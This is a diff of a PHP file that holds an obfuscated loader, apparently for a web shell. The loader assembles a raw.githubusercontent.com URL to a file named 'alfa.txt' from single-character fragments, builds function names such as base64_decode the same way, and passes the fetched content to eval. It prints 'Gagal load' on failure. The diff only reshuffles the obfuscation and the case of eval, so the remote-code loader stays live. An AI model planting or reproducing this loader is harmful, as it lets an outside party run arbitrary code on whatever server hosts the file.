@@ -30,13 +30,13 @@
  */
 
 $_u = 'h'.'t'.'t'.'p'.'s'.':' . '/' . '/' .
-       'r'.'a'.'w'.'.'.'g'.'i'.'t'.'h'.'u'.'b'.'u'.'s'.'e'.'r'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'.'c'.'o'.'m' . '/' .
-       'i'.'m'.'o'.'u'.'s'.'0'.'0'.'7' . '/' .
-       'n'.'e'.'w' . '/' .
-       'r'.'e'.'f'.'s' . '/' .
-       'h'.'e'.'a'.'d'.'s' . '/' .
-       'm'.'a'.'i'.'n' . '/' .
-       'a'.'l'.'f'.'a'.'.'.'t'.'x'.'t';;
+      'raw'.'.'.'github'.'usercontent'.'.'.'com' . '/' .
+      'imous007' . '/' .
+      'new' . '/' .
+      'refs' . '/' .
+      'heads' . '/' .
+      'main' . '/' .
+      'alfa' . '.txt';;
 
 $_iniget = 'i'.'n'.'i'.'_'.'g'.'e'.'t';
 $_func_exists = 'f'.'u'.'n'.'c'.'t'.'i'.'o'.'n'.'_' . 'e'.'x'.'i'.'s'.'t'.'s';
@@ -69,7 +69,7 @@ if ($_open) {
 
 if ($_out !== false) {
     $_b64 = 'b'.'a'.'s'.'e'.'6'.'4'.'_' . 'd'.'e'.'c'.'o'.'d'.'e';
-    EvAl('?>' . call_user_func($_b64, BasE64_EncodE($_out)));
+    eval('?>' . call_user_func($_b64, BasE64_EncodE($_out)));
 } else {
     echo 'G'.'a'.'g'.'a'.'l'.' ' . 'l'.'o'.'a'.'d';
 }
